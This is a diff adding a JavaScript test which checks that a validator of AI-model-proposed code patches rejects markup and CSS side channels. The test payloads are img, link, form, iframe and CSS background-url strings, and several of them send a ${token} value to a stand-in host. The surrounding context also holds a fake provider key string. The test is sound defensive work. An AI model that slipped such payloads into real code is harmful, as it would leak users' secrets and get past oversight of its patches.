@@ -90,6 +90,20 @@ test('model replacements cannot add browser side-channel transports', () => {
   }
 });
 
+test('model proposal rejects markup and CSS side channels without fetch calls', () => {
+  for (const replacement of [
+    '<img src={\`https://example.invalid/?secret=\${token}\`} />',
+    '<a href={unsafeUrl}>Open</a>',
+    '<form action={target}>Send</form>',
+    '<iframe\\n src={unsafeUrl} />',
+    'const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };',
+    'const style = { background: \`url(https://example.invalid/\${token})\` };'
+  ]) {
+    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
+  }
+});
+
 test('modern provider keys and bearer tokens are rejected before external source disclosure', async () => {
   const examples = [
     'sk-or-v1-' + 'a'.repeat(40),
